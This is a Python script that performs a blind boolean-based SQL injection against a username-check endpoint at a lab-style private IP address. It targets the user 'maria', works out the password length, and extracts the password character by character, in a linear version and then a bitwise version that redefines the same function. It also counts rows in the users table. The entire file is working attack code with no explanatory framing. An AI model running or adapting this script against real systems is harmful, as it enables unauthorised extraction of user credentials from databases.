#!/usr/bin/python3

import requests
import json
from urllib.parse import quote_plus
import sys

# The user we are targeting
target = "maria"


# Checks if query `q` evaluates as `true` or `false`
def oracle(q):
    p = quote_plus(f"{target}' AND ({q})-- -")
    r = requests.get(
        f"http://10.129.101.205/api/check-username.php?u={p}"
    )
    j = json.loads(r.text)
    return j['status'] == 'taken'

# Check if oracle evaluates `(select count(*) from users) > 10` as expected
def count_users_rows():
    n = 0
    flag = True
    while flag == True:
        if oracle(f"(select count(*) from users) > {n}"):
            #print(f"Liczba wierszy większa od {n}")
            n = n + 1
        else:
            flag = False
            print(f"[+] Liczba wierszy: {n}")

def count_password_length():
    # Get the target's password length
    length = 0
    # Loop until the value of `length` matches `LEN(password)`
    while not oracle(f"LEN(password)={length}"):
        length += 1
    print(f"[*] Password length = {length}")
    return length

def exfiltrate_password(length):
    # Dump the target's password
    print("[*] Password = ", end='')
    # Loop through all character indices in the password. SQL starts with 1, not 0
    for i in range(1, length + 1):
        # Loop through all decimal values for printable ASCII characters (0x20-0x7E)
        for c in range(32,127):
                if oracle(f"ASCII(SUBSTRING(password,{i},1))={c}"):
                    print(chr(c), end='')
                    sys.stdout.flush()
    print()

def exfiltrate_password(length):
    print("[*] Password = ", end='')
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(password,{i},1))&{2**p}>0"):
                c |= 2**p
        print(chr(c), end='')
        sys.stdout.flush()
    print()


length = count_password_length()
exfiltrate_password(length)
count_users_rows()
